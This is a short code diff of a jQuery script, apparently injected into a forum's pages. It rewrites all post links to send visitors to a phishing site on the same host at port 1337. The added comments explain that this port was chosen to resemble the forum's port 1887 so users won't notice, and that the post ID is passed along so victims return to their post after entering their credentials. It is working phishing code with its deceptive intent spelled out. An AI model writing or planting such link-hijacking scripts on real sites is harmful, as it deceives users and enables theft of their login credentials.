@@ -104,6 +104,9 @@ $(document).ready(function () {
       var original_path = $(this).attr("href");
       var hostname = window.location.hostname;
       // Replace all links in the table of posts with links to the phishing site
+      // N.B. the forum site runs on port 1887, the phishing site is port 1337
+      // We're hoping that if the ports look similar enough the user won't notice
+      // they're on a different site
       // Pass along the ID of the post the user was trying to see (so we can
       // direct them back to it after 'logging them back in')
       var new_href = "http://" + hostname + ":1337" + original_path;
